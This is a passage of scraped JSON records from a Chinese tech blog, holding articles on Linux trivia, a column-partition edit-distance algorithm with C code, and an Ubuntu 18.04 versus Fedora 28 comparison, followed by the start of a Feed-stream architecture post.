的成熟度级别,\n,3，为每个微服务单独构建,\n,4，部署到容器,\n,5，将服务设计为无状态服务,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 1 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114308/", "url_object_id": "3d6b98bd9089c6d286e9cd56043a5c06", "front_image_path": "full/2c71fc7a77086bca21c9b4854d1a7119552d3db0.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/08/07da294f28a2b2db5b251dfd6a548197.jpg"], "title": "Linux 27 周年，这 27 件相关的有趣事实你可能不知道", "create_time": "2018/08/26", "vote": "1", "bookmark": 0, "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,OMG Ubuntu,   译文出处：,开源中国,   ,许多人认为10月5日是 Linux 系统的周年纪念日，因为这是 Linux 在1991年首次对外公布的时间。不过，你可能不知道的是，早在1991年8月25日，当年还是大学生的 Linus Torvalds 就向 comp.os.minix 新闻组的人透露了由于“业余爱好”他正在研究操作系统的消息。因此，该时间也被许多爱好者视为 Linux 的真正诞生日期。,\n,为纪念 Linux 27 岁诞辰，,OMG Ubuntu, 列出了 27 个与 Linux 和 Linus Torvalds 相关的有趣事实。,\n,\n,1、截至 2018 年，Linux 内核已有 20,323,379 行代码。尽管近期有所减少，但庞大的代码量意味着 Linux 仍然是地球上（单个）最大的开源项目。,\n,2、Linux 差点不叫这个名字！Linus Torvalds 原本想把他的“业余爱好”项目称为“FreaX”（“ Free”和“Unix”的组合）。值得庆幸的是，他早期使用的代码托管服务器的所有者说服了他，最终取名为 “Linux”（“Linus”和“Unix”的组合）。,\n,3、首个 Linux 版本 100％ 由 Linus Torvalds 编写，但最新的版本仅包含不到 1％ 的 Linus 编写的代码。他并不懈怠，现在主要是忙于管理和合并其他开发者编写的代码。,\n,4、Linux 被世界上所有主要的太空计划使用，包括 NASA 和 ESA 。,\n,5、谈及更广阔的宇宙，有以 Linux 和 Linus Torvalds 命名的小行星。,\n,6、Linux 的吉祥物 Tux 之所以是一只企鹅，据 Linus 回忆是因为他曾经被一只愤怒的企鹅咬伤。,\n,7、Linux 完全统治超级计算机。截至2018年，世界上最快的 500 个超级计算机 100％ 运行 Linux 。,\n,8、Linux 开发社区非常活跃。据统计，在过去 15 个月里，Linux Kernel 以平均每小时 7.8 个补丁的速度被合并。,\n,9、 Linux 早期以 MINIX 操作系统为原型，导致 Linus 采用类似于 Minix 的文件系统布局来实现他的新兴项目。之后由于被证明效率低下，Linus 采用“扩展文件系统”（ext）取代它，至今仍在使用。,\n,10、Linux 1.0 于1994年3月14日发布，共包含 176,250 行代码。2.0 版本紧随其后，于1996年发布。,\n,11、Linux 正运行在从智能手机到服务器，再到潜艇和太空火箭等大量事物上。,\n,12、乔布斯曾在2000年为 Linus Torvalds 提供一份工作，条件是他停止在 Linux 上的开发。Linus 拒绝了。,\n,13、Linux 有多成功？它的长期竞争对手微软，在90年代初曾试图“熄灭”该项目，到现在却在利用 Linux 进行服务器业务，甚至在为内核开发做贡献！,\n,14、说到贡献，谷歌、英特尔、华为、三星、红帽、Canonical 和 Facebook 是近年来 Linux 内核开发的主要贡献者。,\n,15、Linus 出生于芬兰，一个双语国家，并认为瑞典语是他的“母语”。他说，由于发音不同，他常常觉得用英语说话“不舒服”，但却更喜欢阅读英文书籍。,\n,16、Linux 可能是现在最大的自由软件项目（参见第一条），不过在1991年首次发布时，它仅有约 10 万行代码。,\n,17、在重新调整其开发和发布时间表后，新版本的 Linux kernel 现在基本每隔 66 天左右发布一次。,\n,18、Linux 不是 Linus Trovalds 唯一知名的作品，还有 Git 版本控制系统和潜水应用 Subsurface 。,\n,19、据估计，90％ 的好莱坞视觉效果在生产流程的某个阶段依赖于 Linux 。,\n,20、根据 openhub.net 的统计数据，超过 95％ 的 Linux 是用 C 语言编写的。,\n,21、最新版本的 Linux kernel 可能有 13.3％的代码由空行组成。这并非毫无意义，空行是严谨的编码风格的一部分，使内核保持整洁、高效和有序。,\n,22、基于 Linux 的 Android 是目前全球最成功的移动操作系统。,\n,23、Linux 的每个内核版本都有一个有趣的代号，比如 v4.13 的 “Fearless Coyote” (v4.13) 和 v4.18 的 “Merciless Moray” 。,\n,24、据红帽所述，排名前十的公有云中有 9 个是运行在 Linux 上的。,\n,25、Ubuntu 是世界上最流行的基于 Linux 的桌面操作系统，它在全球拥有约 2000 万用户。Linux 占台式计算机约 2％ 的使用份额。,\n,26、第一本关于 Linux 的出版物是 Matt Welsh 于1993年出版的 “Linux 安装和入门” 。第一本专刊 “Linux Journal” 于1994年3月出版，并首次对 Linus 进行了采访。,\n,27、Linux 是开源领域最着名的模范，但其实早期版本的 Linux 是禁止商业使用或再分发的。直到1992年发布 0.12 版本，Linus 才采用 GPL 协议。,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        ,  收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114321/", "url_object_id": "f24ce825da4820b7e7dbda3b9fa2020b", "front_image_path": "full/8d90d339ad3f964cdd84201e17fd7d46aecb20bf.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2014/10/9184208f96827c412ab7d3570590ef76.jpg"], "title": "死磕一周算法，我让服务性能提高50%", "create_time": "2018/08/27", "vote": "1", "bookmark": "1", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,haolujun,   ,前言,\n,我最近一直在公司做检索性能优化。当我看到这个算法之前，我也不认为我负责的检索系统性能还有改进的余地。但是这个算法确实太牛掰了，足足让服务性能提高50%，我不得不和大家分享一下。其实前一段时间的博客中也写到过这个算法，只是没有细讲，今天我准备把它单独拎出来，说道说道。说实话，本人数学功底一般，算法证明不是我强项，所以文中的证明只是我在论文作者的基础上加入了自己的思考方法，并且还没有完全证明出来，请大家见谅 ! 欢迎爱思考的小伙伴进行补充。我只要达到抛砖引玉的作用，就知足了。,\n,回归正题，我们的检索服务中用到了最小编辑距离算法，这个算法本身是平方量级的时间复杂度，并且很少人在帖子中提到小于这个复杂度的算法。但是我无意中发现了另外一个更牛的算法：列划分算法，使得这个本就很牛的算法性能直接提高一倍。接下来进入正题。,\n,列划分算法,\n,这个算法比较难理解，出自如下论文：《Theoretical and empirical comparisons of approximate string matching algorithms》。In Proceedings of the 3rd Annual Symposium on Combinatorial Pattern Matching, number 664 in Lecture Notes in Computer Science, pages 175~184. Springer-Verlag, 1992。Author:WI Chang ，J Lampe。所以有必要先给大家普及一些共识。,\n,编辑矩阵, 最小编辑距离在计算过程中使用动态规划算法计算的那个矩阵，了解这个算法的都懂，我不赘述。但是我们的编辑矩阵有个特点：第一行都是0，这么做的好处是：只要文本串T中的任意一个子序列与模式串P的编辑距离小于某个固定的数值，就会被发现。,\n,给大伙一个样例，文本串T=annealing，模式串P=annual：,\n,\n,注意，第一行都是0，这是与传统最小编辑距离的最大区别，其余的动归方程完全相同。,\n,对角线法则, 编辑矩阵沿着右下方对角线方向数值非递减，并且至多相差1。,\n,行列法则, 每行每列相邻两个数至多相差1。,\n,观察编辑距离矩阵，我们发现如下事实：每一列是由若干段连续数字组成。所以我们把编辑矩阵的每一列划分成若干连续序列，如下图所示：,\n,\n,红色框中就是一个一个的序列，序列内部连续。,\n,序列-δ 定义, 对于编辑矩阵的每一个元素D[j][i] (j是行，i是列)，若 j – D[j][i] = δ，我们就说D[j][i]属于i列上的 序列-δ，我们还观察到随着j增大，j – D[j][i]是非递减的。如下图所示：,\n,\n,序列-δ终止位置, 每个序列都会有起始和终止位置。序列-δ的终止位置为j，如果j是序列-δ的最小横坐标，并且满足D[j+1][i]属于序列-ε，并且ε>δ（即j+1-D[j+1][i]>δ）。,\n,长度为0的序列, 我们发现如果按照如上定义，每一列上δ的值并不一定连续，总是或有或无的缺少一个数值。所以我们定义长度为0的序列：当D[j+1][i] < D[j][i]时，我们就在序列-δ和序列-(δ+2)之间人为插入一个长度为0的序列-(δ+1)。如下图所示：,\n,\n,所以，我们按照这个定义，就可以对编辑矩阵的每列进行一个划分，划分的每一段都是一串连续数字。,\n,说了这么多，这个定义有什么用呢？假若，我们每次都能根据前一列的列划分情况直接推导出后一列的列划分情况，那么就可以省去好多计算，毕竟每一个划分中的每一段的数字都是连续的，这就暗示我们可以直接用一个常数时间的加法直接得到某一个编辑矩阵的元素值，而不用使用最小编辑距离的动态规划算法去计算。,\n,接下来的重点来了，我们介绍这个推导公式，请打起十二分精神！我们按照序列-δ长度是否为0来介绍这个推论。由于其中一个推论文字描述太繁琐，不容易理解，所以我画了个图：,\n,\n,接下来烧脑开始。,\n,\n,推论1：如果列i上长度为0的 序列-δ 的结束位置为j，则列i+1上的 序列-δ 的结束位置为 j+1。,\n,\n,证明, ：由推论前提我们知道 δ = j – D[j][i] + 1 （想想前面说的δ值不连续，我们就人为插入一个中间值，只不过长度为0）。,\n我们观察编辑矩阵就会发现如下两个事实：,\n,\n,事实1：D[j+1][i+1] = D[j][i] （ 别问为什么， 自己观察， 看看是不是都这样， 其实可以用反证法，我们就不证明了）。,\n,事实2：D[j+2][i+1] <= D[j][i]。,\n,\n,通过事实1，我们知道D[j+1][i+1]确实属于 序列-δ，因为 j + 1 – D[j+1][i+1] = j + 1 – D[j][i] = δ。,\n,通过事实2，我们知道列i+1上的序列δ，终止位置为j+1。,\n,所以推论1证明结束。,\n,\n,推论2： 文字描述略，请看图,\n,\n,证明, ：,\n,\n,设这个序列长度为L，除了每列的第一个序列外，其余序列的其余位置均是当前的编辑距离小于等于该列上一个位置的编辑距离：即D[j-L+1][i]<=D[j-L][i]，所以，我们可以推出：D[j-L+1][i] <= D[j-L][i];,\n,再根据编辑矩阵对角线非递减我们知道，D[j-L+1][i+1] >= D[j-L][i];,\n,\n,综上两点我们得到如下大小关系：D[j-L+1][i+1] >= D[j-L+1][i]。,\n,此外我们知道我们当前列的序列-δ截止位置为j，也意味着D[j+1][i] <= D[j][i]，同样根据对角线法则，我们得出D[j+2][i+1] <= D[j+1][i] + 1 <= D[j][i] + 1。,\n,接下来到了最精彩的一步，我们知道列i当前序列-δ内的值是连续的，如果起始编辑距离为A，那么终止编辑距离为A+L-1。,\n,而由我们的推导可以发现：D[j-L+1][i+1] >= A，D[j+2][i+1] <= (A+L-1) + 1 = A+L，而之间跨越的长度为 (j+2)-(j-L+1)+1= L+2。 我们可以推出列i+1上从行j-L+1到行j+2之间的序列一定不连续，否则D[j+2][i+1] >= A+L+2-1= A+L+1，与我们先前的推导矛盾。所以，在j-L+1和j+2之间一定有一个列终止，这样才能消去一个序号。,\n,\n,此外我们还有一个疑问，列i+1上的序列-δ结束位置一定在j-L+1和j+1之间么？我们要证明这个事。,\n,\n,证明, ：,\n,因为δ=j-D[j][i]=j-L+1-D[j-L+1][i]>=j-L+1-D[j-L+1][i+1]，即列i+1上的 序列-δ的结束位置一定在j-L+1或者之后；,\n,由于j+1-D[j+1][i]>δ，根据对角线法则D[j+2][i+1] <= D[j+1][i]+1，有j+2-D[j+2][i+1]>=j+2-(D[j+1][i]+1)=j+1-D[j+1][i] > δ， 固列i+1上的序列-δ的终止位置一定在j+2之前，即j-L+1到j+1之间。,\n,后面推论2的分情况讨论，我一个也没证明出来，作者在论文中轻飘飘的一句话“后面很好证明，他就不去证明了”，但是却消耗了我所有脑细胞。所以，如果哪位小伙伴把推论2剩下的内容证明出来了，欢迎给我留言，我也学习学习。,\n,这个算法的时间复杂度是多少呢？作者用启发式的方法证明了算法的复杂度约为$ O(mn/sqrt[2]{b}) $，其中b是字符集大小。,\n,代码实现,\n,接下来说一下代码实现，给出我总结出来的步骤，否则很容易踩坑。,\n,\n,编辑矩阵第一列，肯定只有一个序列。,\n,每次遍历前一列的所有序列，根据推论1和推论2计算后一列的划分情况。,\n,如果前一列遍历完毕，但是下一列还有剩余的元素没有划分。没关系，下一列剩下的元素都归为一个新的序列。,\n,预处理一个表，表中记录T中的每个字符在P中的位置。可以直接用哈希算法（最好直接ascii码）进行定位，如果位置不唯一，可以拉链。进行列划分计算时，从前往后遍历那一链上的位置，直到找到第一个符合条件的，速度出奇的快。尽可能少使用或者不要使用map进行定位，测试发现相当慢。,\n,\n,接下来做最不愿意做的事：贴一个代码，很丑。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ninline int loc(int find[][200], int *len, int ch, int pos) {\r\n  for(int i = 0; i < len[ch]; ++i) {\r\n    if(find[ch][i] >= pos)  return find[ch][i];\r\n  }\r\n  return -1;\r\n}\r\n\r\nint new_column_partition(char *p, char *t) {\r\n  int len_p = strlen(p);\r\n  int len_t = strlen(t);\r\n  int find[26][200];\r\n  int len[26] = {0};\r\n  int part[200];  //记录每一个序列的结束位置\r\n  //生成loc表，用来快速查询\r\n  for(int i = 0; i < len_p; ++i) {\r\n    find[p[i] - 'a'][len[p[i] - 'a']++] = i + 1;\r\n  }\r\n  \r\n  int pre_cn = 0, next_cn = 1, min_v = len_p;\r\n  part[0] = len_p;\r\n  \r\n  for(int i = 0; i < len_t; ++i) {\r\n    //前一列partition数\r\n    pre_cn = next_cn;\r\n    next_cn = 0;\r\n    int l = part[0] + 1;\r\n    int b = 1;\r\n    int e = l;\r\n    int tmp;\r\n    int tmp_value = 0;\r\n    int pre_v = part[0];\r\n    //前一列第0个partition长度肯定>=1\r\n    if(len[t[i] - 'a'] >0 && (tmp = loc(find, len, t[i] - 'a', b)) != -1 && tmp <= e) {\r\n      part[next_cn++] = tmp - 1;\r\n    } else if(pre_cn >= 2 && part[1] - part[0] != 0){\r\n      part[next_cn++] = part[0] + 1;\r\n    } else {\r\n      part[next_cn++] = part[0];\r\n    }\r\n    //每列第一个partition尾值\r\n    tmp_value = part[0];\r\n\r\n    //遍历前一列剩下的partition\r\n    for(int j = 1; j < pre_cn && part[next_cn - 1] < len_p; ++j) {\r\n      int x = part[j], y = pre_v;\r\n      pre_v = part[j];\r\n      l = x - y;\r\n      if(l == 0) {\r\n        part[next_cn++] = x + 1;\r\n      } else {\r\n        b = x - l + 2;\r\n        e = x + 1;\r\n        if(b <= len_p && len[t[i] - 'a'] > 0 && (tmp = loc(find, len, t[i] - 'a', b)) != -1 && tmp <= e) {\r\n          part[next_cn++] = tmp - 1;\r\n        } else if(j + 1 < pre_cn && part[j + 1] - x != 0) {\r\n          part[next_cn++] = x + 1;\r\n        } else {\r\n          part[next_cn++] = x;\r\n        }\r\n      }\r\n      l = part[j] - part[j - 1];\r\n      if(l == 0) {\r\n        //新得到的partition长度为0，那么下一个partition的起始值比上一个partition尾值少1\r\n        tmp_value -= 1;\r\n      } else {\r\n        tmp_value += l - 1;\r\n      }\r\n    }\r\n    \r\n    if(part[next_cn - 1] != len_p) {\r\n      part[next_cn++] = len_p;  \r\n      tmp_value += len_p - part[next_cn - 2] - 1;\r\n      if(tmp_value < min_v) {\r\n        min_v = tmp_value;\r\n      }\r\n    } else {\r\n      min_v = min_v < tmp_value ? min_v : tmp_value;\r\n    }\r\n  }\r\n  return min_v;\r\n},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,inline ,int, ,loc,(,int, ,find,[,],[,200,],,, ,int, ,*,len,,, ,int, ,ch,,, ,int, ,pos,), ,{,  ,for,(,int, ,i, ,=, ,0,;, ,i, ,<, ,len,[,ch,],;, ,++,i,), ,{,    ,if,(,find,[,ch,],[,i,], ,>=, ,pos,),  ,return, ,find,[,ch,],[,i,],;,  ,},  ,return, ,-,1,;,}, ,int, ,new_column_partition,(,char, ,*,p,,, ,char, ,*,t,), ,{,  ,int, ,len_p, ,=, ,strlen,(,p,),;,  ,int, ,len_t, ,=, ,strlen,(,t,),;,  ,int, ,find,[,26,],[,200,],;,  ,int, ,len,[,26,], ,=, ,{,0,},;,  ,int, ,part,[,200,],;,  ,//记录每一个序列的结束位置,  ,//生成loc表，用来快速查询,  ,for,(,int, ,i, ,=, ,0,;, ,i, ,<, ,len_p,;, ,++,i,), ,{,    ,find,[,p,[,i,], ,-, ,'a',],[,len,[,p,[,i,], ,-, ,'a',],++,], ,=, ,i, ,+, ,1,;,  ,},  ,  ,int, ,pre_cn, ,=, ,0,,, ,next_cn, ,=, ,1,,, ,min_v, ,=, ,len_p,;,  ,part,[,0,], ,=, ,len_p,;,  ,  ,for,(,int, ,i, ,=, ,0,;, ,i, ,<, ,len_t,;, ,++,i,), ,{,    ,//前一列partition数,    ,pre_cn, ,=, ,next_cn,;,    ,next_cn, ,=, ,0,;,    ,int, ,l, ,=, ,part,[,0,], ,+, ,1,;,    ,int, ,b, ,=, ,1,;,    ,int, ,e, ,=, ,l,;,    ,int, ,tmp,;,    ,int, ,tmp_value, ,=, ,0,;,    ,int, ,pre_v, ,=, ,part,[,0,],;,    ,//前一列第0个partition长度肯定>=1,    ,if,(,len,[,t,[,i,], ,-, ,'a',], ,>,0, ,&&, ,(,tmp, ,=, ,loc,(,find,,, ,len,,, ,t,[,i,], ,-, ,'a',,, ,b,),), ,!=, ,-,1, ,&&, ,tmp, ,<=, ,e,), ,{,      ,part,[,next_cn,++,], ,=, ,tmp, ,-, ,1,;,    ,}, ,else, ,if,(,pre_cn, ,>=, ,2, ,&&, ,part,[,1,], ,-, ,part,[,0,], ,!=, ,0,),{,      ,part,[,next_cn,++,], ,=, ,part,[,0,], ,+, ,1,;,    ,}, ,else, ,{,      ,part,[,next_cn,++,], ,=, ,part,[,0,],;,    ,},    ,//每列第一个partition尾值,    ,tmp_value, ,=, ,part,[,0,],;, ,    ,//遍历前一列剩下的partition,    ,for,(,int, ,j, ,=, ,1,;, ,j, ,<, ,pre_cn, ,&&, ,part,[,next_cn, ,-, ,1,], ,<, ,len_p,;, ,++,j,), ,{,      ,int, ,x, ,=, ,part,[,j,],,, ,y, ,=, ,pre_v,;,      ,pre_v, ,=, ,part,[,j,],;,      ,l, ,=, ,x, ,-, ,y,;,      ,if,(,l, ,==, ,0,), ,{,        ,part,[,next_cn,++,], ,=, ,x, ,+, ,1,;,      ,}, ,else, ,{,        ,b, ,=, ,x, ,-, ,l, ,+, ,2,;,        ,e, ,=, ,x, ,+, ,1,;,        ,if,(,b, ,<=, ,len_p, ,&&, ,len,[,t,[,i,], ,-, ,'a',], ,>, ,0, ,&&, ,(,tmp, ,=, ,loc,(,find,,, ,len,,, ,t,[,i,], ,-, ,'a',,, ,b,),), ,!=, ,-,1, ,&&, ,tmp, ,<=, ,e,), ,{,          ,part,[,next_cn,++,], ,=, ,tmp, ,-, ,1,;,        ,}, ,else, ,if,(,j, ,+, ,1, ,<, ,pre_cn, ,&&, ,part,[,j, ,+, ,1,], ,-, ,x, ,!=, ,0,), ,{,          ,part,[,next_cn,++,], ,=, ,x, ,+, ,1,;,        ,}, ,else, ,{,          ,part,[,next_cn,++,], ,=, ,x,;,        ,},      ,},      ,l, ,=, ,part,[,j,], ,-, ,part,[,j, ,-, ,1,],;,      ,if,(,l, ,==, ,0,), ,{,        ,//新得到的partition长度为0，那么下一个partition的起始值比上一个partition尾值少1,        ,tmp_value, ,-=, ,1,;,      ,}, ,else, ,{,        ,tmp_value, ,+=, ,l, ,-, ,1,;,      ,},    ,},    ,    ,if,(,part,[,next_cn, ,-, ,1,], ,!=, ,len_p,), ,{,      ,part,[,next_cn,++,], ,=, ,len_p,;,  ,      ,tmp_value, ,+=, ,len_p, ,-, ,part,[,next_cn, ,-, ,2,], ,-, ,1,;,      ,if,(,tmp_value, ,<, ,min_v,), ,{,        ,min_v, ,=, ,tmp_value,;,      ,},    ,}, ,else, ,{,      ,min_v, ,=, ,min_v, ,<, ,tmp,_,value, ,?, ,min_v, ,:, ,tmp_value,;,    ,},  ,},  ,return, ,min_v,;,},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,结语,\n,这个算法应用到线上之后，效果非常明显，如下对比。,\n,\n,优化前CPU：,\n,\n,优化后CPU：,\n,\n,\n,能力有限，证明不充分，有兴趣的小果伴可以直接去看原版论文，欢迎交流，共同进步。,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 1 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114324/", "url_object_id": "9001107b7d2f77903c7b54070031412d", "front_image_path": "full/506f77aba037cb2bd78064b80470760038a6d491.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/08/ddb1f665d74f913109feb4dfead998f1.jpg"], "title": "对比 Ubuntu 18.04 和 Fedora 28", "create_time": "2018/08/27", "vote": "1", "bookmark": "1", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,Linuxandubuntu,   译文出处：,Linux中国/Andy Song,   ,\n,大家好，我准备在今天突出说明一下两大主流 Linux 发行版，即 ,Ubuntu 18.04, 和 ,Fedora 28,，包括一些特性和差异。两者都有各自的包管理系统，其中 Ubuntu 使用 DEB，Fedora 使用 RPM；但二者使用同样的,桌面环境Desktop Environment, （DE）,GNOME,，并致力于为 Linux 用户提供高品质的桌面体验desktop experience。,\n,Ubuntu 18.04, 是 Ubuntu 目前最新的 ,长期支持版本Long Term Support,（LTS），为用户提供 GNOME 桌面系统。,Fedora 28, 也提供 GNOME 桌面系统，但落实到具体的软件包管理方面，二者的桌面体验存在差异；在用户界面User Interfaces方面也显然存在差异。,\n,基本概念,\n,不知你是否了解，虽然 Ubuntu 基于 Debian，但 Ubuntu 比 Debian 更早提供最新版本的软件。举个例子，当 Ubuntu 提供流行网页浏览器 Firefox Quantum 时，Debian 仍在提供 Firefox 的延期支持版Extended Support Release（ESR）。,\n,（LCTT 译注：从 2012 年 1 月开始，Firefox 进入快速版本期，每 6 周发布新的主线版本，每隔 7 个主线版本发布新的 ESR 版本。Firefox 57 的桌面版发布时被命名为 Firefox Quantum，同期的 ESR 版本与 Firefox 52 一同发布并基于 Firefox 48。参考 ,Wiki: History_of_Firefox,）,\n,同样的情况也适用于 Fedora，它为终端用户提供前沿的软件，也被用作下一个稳定版本的 RHEL (Red Hat Enterprise Linux) 的测试平台。,\n,桌面预览,\n,Fedora 提供原汁原味的vanilla GNOME 桌面体验；相比之下，Ubuntu 18.04 对 GNOME 做了若干方面的微调，以便长期以来的 Unity 用户可以平滑的过渡到 GNOME 桌面环境。,\n,为节省开发时间，Canonical （从 Ubuntu ,17.10, 开始）已经决定放弃 Unity 并转向 GNOME 桌面，以便可以将更多精力投入到 IoT 领域。,\n,因此，在 Fedora 的桌面预览中，我们可以看到一个简洁的无图标桌面和一个自动隐藏的侧边栏，整体外观采用 GNOME 默认的 Adwaita 主题。,\n,\n,相比之下，Ubuntu 采用其经典的有图标桌面样式，左侧边栏用于模拟其传统的“程序坞dock”，使用 Ubuntu Ambiance 主题定制化窗口，与其传统的（Unity 桌面）外观和体验基本一致。,\n,\n,虽然存在一定差异，但习惯使用其中一种桌面环境后切换到另外一种并不困难。毕竟二者设计时都充分考虑了简洁性和用户友好性，即使是新用户也不会对这两种 Linux 发行版感到不适应。,\n,但外观或 UI 并不是决定用户选择哪一种 Linux 发行版的唯一因素，还有其它因素也会影响用户的选择。下面主要介绍两种 Linux 发行版在软件包管理相关方面的内容。,\n,软件中心,\n,Ubuntu 使用 dpkg（即 Debian Package Management）将软件分发给终端用户；Fedora 则使用 rpm（全称为 Red Hat Package Management）。它们都是 Linux 社区中非常流行的包管理系统，对应的命令行工具也都简单易用。,\n,\n,但在具体分发的软件方面，各个 Linux 发行版会有明显差异。Canonical 每 6 个月发布新版本的 Ubuntu，一般是在每年的 4 月和 10 月。对每个版本，开发者会维护一个开发计划；Ubuntu 新版本发布后，该版本就会进入冻结freeze状态，即停止新软件的开发和测试。,\n,相比之下，Fedora 也采用相似的 6 个月发布周期，看起来很像一种滚动更新rolling release的 Linux 发行版（其实并不是这样）。与 Ubuntu 不同之处在于，（Fedora 中的）几乎所有软件包更新都很频繁，让用户有机会尝试最新版本的软件。但这样也导致软件 Bug 更频繁出现，给用户带来“不稳定性”，虽然还不至于导致系统不可用。,\n,软件更新,\n,我上面已经提到了 Ubuntu 版本的冻结状态。好吧，由于它对 Ubuntu 软件更新方式有着重要的影响，我再次提到这个状态：当 Ubuntu 新版本发布后，该版本的开发（这里是指测试新软件）就停止了。,\n,即将发布的下个版本的开发也随之开始，先后历经 “每日构建daily build” 和 “测试版beta release” 阶段，最后作为新版本发布给终端用户。,\n,在冻结状态下，Ubuntu 维护者不会在软件源package repository中增加最新版软件，除非用于解决严重的安全问题。因此，Ubuntu 用户可用的软件更新更多涉及 Bug 修复而不是新特性，这样的好处在于系统可以保持稳定，不会扰乱用户的使用。,\n,Fedora 试图为终端用户提供最新版本的软件，故用户的可用软件更新相比 Ubuntu 而言会更多涉及新特性。当然，开发者为了维持系统的稳定性，也采取了一系列措施。例如，在操作系统启动时，用户可以从最多三个可用内核working kernel（最新内核处于最上方）中进行选择；当新内核无法启动时，用户可以回滚使用之前两个可用内核。,\n,Snaps 和 flatpak,\n,它们都是新出现的酷炫工具，可以将软件发布到多个 Linux 发行版上。Ubuntu 提供 ,snaps,，而 Fedora 则提供 ,flatpak, 。二者之中 snaps 更加流行，更多流行软件或版权软件都在考虑上架 snap 商店。Flatpak 也在吸引关注，越来越多的软件上线该平台。,\n,不幸的是，由于二者出现的时间都不久，很多人遇到“窗口主题不一致window theme-breaking”问题并在网上表达不满。但由于二者都很易于使用，在二者之间切换并不是难事。,\n,（LCTT 译注：按译者理解，由于二者都增加了一层安全隔离，读取系统主题方面会遇到问题；另外，似乎也有反馈 snap 专用主题无法及时应用于 snap 的问题）,\n,应用对比,\n,下面列出一些在 Ubuntu 和 Fedora 上共有的常见应用，然后在两个平台之间进行对比：,\n,计算器,\n,Fedora 上的计算器程序启动速度更快。这是因为 Fedora 上的计算器程序是软件包形式安装的，而 Ubuntu 上的计算器程序则是 snap 版本。,\n,系统监视器,\n,可能听上去比较书呆子气，但我认为观察计算机性能并杀掉令人讨厌的进程是必要且直观的。程序启动速度对比与计算器的结果一致，即 （软件包方式安装的）Fedora 版本快于（snap 形式提供的）Ubuntu 版本。,\n,帮助程序,\n,我已经提到，（为便于长期以来的 Untiy 用户平滑切换到 GNOME），Ubuntu 提供的 GNOME 桌面环境是经过微调的版本。不幸的是，Ubuntu 开发者似乎忘记或忽略了对帮助程序的更新，用户阅读文档（入门视频）后会发现演示视频与真实环境有略微差异，这可能让人感到迷惑。,\n,\n,结论,\n,Ubuntu 和 Fedora 是两个主流的 Linux 发行版。两者都各自有一些华而不实的特性，因而新接触 Linux 的人很难抉择。我的建议是同时尝试二者，这样你在试用后可以发现哪个发行版提供的工具更适合你。,\n,希望你阅读愉快，你可以在下方的评论区给出我漏掉的内容或你的建议。,\n, ,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 1 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114327/", "url_object_id": "ef6e75a95b9067935c1a0f11772b2c0c", "front_image_path": "full/1868b505269cd1c49bd1048cb0b76b26116ba5c4.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2011/11/software-development-logo.jpg"], "title": "关于 Feed 流的几个热门问题", "create_time": "2018/07/09", "vote": "1", "bookmark": "1", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,本文作者： ,伯乐在线, - ,v7, 。未经作者许可，禁止转载！,欢迎加入伯乐在线 ,专栏作者,。,\n,0x00 前言,\n,本篇聊一下 Feed 流技术，由于这个话题在业界有丰富的实践经验，所以我特意选了个小的切入点，从相对微观的角度说几个具体的问题，避免一些无意义的重复。希望提炼实践中的具体问题来做讨论，使事情变得更有实际意义。,\n,0x01 先行资料,\n,\n,什么是 Feed 流,\n,如何设计 Twitter 这样的系统架构,\n,如何打造千万级Feed流系统,\n,\n,0x02 关于模型,\n,当要做一个 Feed 流，摆在我们眼前的第一个问题就是到底选推模型还是选拉模型，因为这个选择将影响接下来一系列的架构方式。,\n,\n,推模型 or 拉模型,\n,\n,推模型和拉模型各自的优缺点已经被罗列了很多了，比如推模型的存储量大，或者拉模型的效率可能低，但如果你从无到有做这个事情，这些优缺点的罗列还是无法帮助你做出最初的决定，所谓的“知道了许多道理，还是过不好这一生”，当然除非你有实际的构造大流量 Feed 流的经验。,\n,然而根据我们的经验：基于正确规范的架构和基础设施，对于一个千万日活量级的应用 Feed 流， 拉模型完全可以扛得住。,\n,我想，上面这个结论是很有意义的，尤其是对中小创业公司，因为拉模型本身节省存储资源，开发成本低，上线速度快，在业务爆发之前做这样一个 